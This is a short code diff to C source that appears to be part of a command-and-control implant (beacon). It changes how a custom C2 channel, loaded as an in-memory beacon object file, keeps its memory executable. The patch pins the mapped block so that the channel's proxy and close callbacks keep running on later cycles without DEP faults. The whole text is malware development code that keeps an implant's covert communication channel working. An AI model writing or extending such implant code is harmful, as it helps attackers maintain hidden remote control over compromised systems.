@@ -25,6 +25,12 @@
 #include "datastore.h"
 
 extern sessdata bigsession; /* metadata.cpp */
+
+/* boff.cpp: keep the loaded channel BOF executable - its proxy/close
+ * callbacks run on every later cycle from the mapped block */
+extern void bof_set_pin(BOOL on);
+extern void bof_unpin(void);
+
 #define UDC2_MAX_GET (1024 * 1024)
 
 typedef int(*UDC2PROXY)(const char *, int, char *, int);
@@ -137,6 +143,7 @@ void udc2_close(void) {
 		udc2.info.close();
 	udc2.info.proxy = NULL;
 	udc2.info.close = NULL;
+	bof_unpin(); /* free the channel BOF's mapped block */
 }
 
 BOOL udc2_init(void) {
@@ -170,8 +177,15 @@ BOOL udc2_init(void) {
 	if (magic != 0x32434455 /* 'UDC2' LE */ || objlen <= 0 || entry < 0)
 		return FALSE;
 
-	if (!command_inline_execute_object_parsed(blob + 12, objlen, (DWORD)entry, (char *)&udc2.info, sizeof(UDC2INFO), 0))
+	/* pin the block: the BOF's proxy/close live inside it and run on
+	 * every later cycle (without the pin the loader's idle-RW flip makes
+	 * each call DEP-fault into a silent abort) */
+	bof_set_pin(TRUE);
+	if (!command_inline_execute_object_parsed(blob + 12, objlen, (DWORD)entry, (char *)&udc2.info, sizeof(UDC2INFO), 0)) {
+		bof_set_pin(FALSE);
 		return FALSE;
+	}
+	bof_set_pin(FALSE);
 
 	return udc2.info.proxy != NULL;
 }
